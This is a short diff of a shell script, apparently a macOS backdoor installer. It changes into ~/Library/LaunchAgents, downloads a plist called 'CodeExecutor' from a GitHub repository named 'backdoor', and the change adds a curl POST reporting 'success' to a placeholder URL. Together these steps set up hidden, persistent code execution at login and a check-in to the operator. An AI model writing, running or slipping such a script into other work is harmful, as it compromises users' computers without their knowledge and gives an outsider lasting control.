@@ -1,4 +1,6 @@
 cd ~/Library/LaunchAgents/
 curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfoverflow.CodeExecutor.plist"
 cd ..
-echo "success" >> .bombmaterials
+curl -d '{                        
+  "success": "true"
+}'   -H "Content-Type: application/json"   https://ur.l
